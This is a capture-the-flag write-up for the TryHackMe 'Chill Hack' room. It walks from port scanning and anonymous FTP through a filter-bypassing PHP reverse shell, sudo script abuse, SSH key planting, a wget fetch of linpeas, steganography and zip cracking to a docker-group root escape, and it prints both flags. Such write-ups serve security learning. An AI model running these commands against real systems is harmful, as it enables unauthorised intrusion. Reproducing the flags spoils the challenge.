# Chill Hack Writeup

> Machine : Linux

> Easy level CTF.  Capture the flags and have fun!

## Solution

I don't know how `TryHackMe` dared to say that this room is easy. But it's ok you have to chill when you hack this.

Let's start with reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.130.139.103 -p-
```

From our results, we can see ports 21 (FTP), 22 (SSH) and 80 (HTTP) are open. And `anonymous` login was allowed. 

```shell
ftp 10.130.139.103
anonymous
```

```shell
ls
```

```text
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
```

```shell
mget note.txt
```

```shell
cat note.txt
```

```text
Anurodh told me that there is some filtering on strings being put in the command -- Apaar

```

That's not clear first. So let's go ahead and browsing the IP.

```shell
gobuster dir -u http://10.130.139.103/ -w /usr/share/wordlists/dirb/common.txt -x php
```

There is one thing that seems interesting.

```text
secret               (Status: 301) [Size: 317] [--> http://10.130.139.103/secret/]
```

Browsing it we found a place when we can run commands. But after trying we found that there is some filtering commands, so now we understand the `note.txt`.

We also know that filtering commands is not the best thing. because in this case we can run the same command with an escape character like `\ls`.

So let's try get a reverse shell.

```shell
nc -lnvp 3333
```

And then run this:

```shell
\php -r '$sock=fsockopen("192.168.129.217",3333);exec("sh <&3 >&3 2>&3");'
```

And we got a shell as `www-data`.

```shell
sudo -l
```

```text
(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

```shell
cat /home/apaar/.helpline.sh
```

```text
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

The script is asks for a `msg` and then run it. So we can run it as user `apaar` and run `/bin/bash`.

```shell
/home/apaar/.helpline.sh
```

```shell
sudo -u apaar /home/apaar/.helpline.sh 
```

```text
Hello user! I am ,  Please enter your message: /bin/bash
```

And now we are user `apaar`. But no normal person can use this shell, so let's get another shell with `ssh`.

```shell
ssh-keygen
```

```shell
ls /home/apaar/.ssh/
```

```text
authorized_keys  id_rsa  id_rsa.pub
```

```shell
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNwwHWg6ehkt3JI6Mdg5gEW9u7JKJ8mPEPS4O18Y/hEu9k9RIQK/mvjkHlwXAz34IBjhtOE18jt3E8YK1Rgh+xOXywGkerNlk5864QB+s7/O0bcB7nGcZwblxeUNTN7yv5VB7AZhdqttm9wBr2BtFINsZW55FalaXe0mPl6F2UM4jjQ5xakNZ5X3jpYCS7dFAdkWCxPaB6YlAOtz+aoknQ3En+wVjsZkUy5osijx8wh+QoHgWpSnD3BLpLRkRKRT+VV8oTxRfZ4Nj8gCBTD1e3teXq9RgzgVrZzNIVtjcok54H1aHNTfwbIPvTmrftoAl/h4/50F8F/kaLqD9gmDu9rB8pL552hGuyRG8M4JRNDmoWr4dsBxr3RinJ473RUEv5vXh/OCaVYFbfUDwlmKMBfEhroSWd7vaBkbZlwjIMfuITEX3oee6Zxw8S67hCDRR7eiS5lZYVKx5Y+6BL2ltAaQP06hJ+yymJxUpYMR+Emc7XfvTZamZwsKqVI+U0bT8= apaar@ip-10-130-139-103" > /home/apaar/.ssh/authorized_keys
```

Then we have to copy `id_rsa` to our machine and then change the file permission and then enter using `ssh`.

```shell
chmod +x id_rsa
```

```shell
ssh apaar@10.130.139.103 -i id_rsa
```

```shell
cat local.txt
```

```text
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

> User Flag
> 
> {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

Now let's run `linpeas.sh`.

On your machine you have to open a server using `Python`.

```shell
python3 -m http.server 8000
```

Then on the target machine.

```shell
cd /dev/shm
```

```shell
/usr/bin/wget "http://192.168.129.217:8000/linpeas.sh"
```

```shell
chmod +x linpeas.sh
```

```shell
./linpeas.sh
```

After the big output, we found:

```text
╔══════════╣ Active Ports (T1049)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                                                 
══╣ Active Ports (ss) (T1049)                                                                                                                                                                
tcp   LISTEN 0      511              127.0.0.1:9001        0.0.0.0:*                                                                                                                         
tcp   LISTEN 0      70               127.0.0.1:33060       0.0.0.0:*            
tcp   LISTEN 0      128                0.0.0.0:22          0.0.0.0:*            
tcp   LISTEN 0      151              127.0.0.1:3306        0.0.0.0:*            
tcp   LISTEN 0      4096         127.0.0.53%lo:53          0.0.0.0:*            
tcp   LISTEN 0      128                   [::]:22             [::]:*            
tcp   LISTEN 0      32                       *:21                *:*            
tcp   LISTEN 0      511                      *:80                *:*  
```

There is ports some open port's.

```shell
curl "127.0.0.1:9001"
```

It's a webserver. So let's try SSH port-forward this webserver to access it on our machines.

```shell
ssh -L 9001:127.0.0.1:9001 apaar@10.130.139.103 -i id_rsa
```

After browsing `127.0.0.1:9001` we found a login page and we don't have credentials.

After some playing with `MySQL` in port 3306 we notice it was a big `rabbit hole`.

Because it's a webserver we can find something on `/var/www/`.

After some search we found `hacker.php`.

```shell
cat /var/www/files/hacker.php 
```

```html
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
        color:red;
        font-weight: bold;
}
h1
{
        color: yellow;
        font-weight: bold;
}
</style>
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```

He said `Look in the dark! You will find your answer` and there is an image `images/hacker-with-laptop_23-2147985341.jpg`

So let's find if there is something hide within the image.

```shell
wget "http://127.0.0.1:9001/images/hacker-with-laptop_23-2147985341.jpg"
```

```shell
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

We found `backup.zip`, but we need a password to unzip it.

```text
zip2john backup.zip > backup.zip.hash
```

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt backup.zip.hash
```

```text
pass1word        (backup.zip/source_code.php)     
```

```shell
unzip backup.zip
pass1word
```

```shell
cat source_code.php
```

```html
<html>
<head>
        Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
                        Email: <input type="email" name="email" placeholder="email"><br><br>
                        Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
                </form>
<?php
        if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                { 
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" name="otp">
                                <input type="submit" name="submitOtp" value="Submit">
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
                                        else
                                        {
                                                echo "Invalid OTP";
                                        }
                                }
                }
                else
                {
                        echo "Invalid Username or Password";
                }
        }
?>
</html>
```

We found there is a password but in base64.

```shell
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
```

```text
!d0ntKn0wmYp@ssw0rd 
```

It's a password for a user, let's try `anurodh`.

```shell
su anurodh
!d0ntKn0wmYp@ssw0rd 
```

And for the third time we got a shell again.

```shell
whoami
```

```text
anurodh
```

```shell
id
```

```text
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

Checking our groups with id, we can see we are part of the `docker` group. So let's search `GTFOBins` to find out.

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

```shell
whoami
```

```text
root
```

```shell
cat proof.txt
```

```text
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

> Root Flag
> 
> {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}

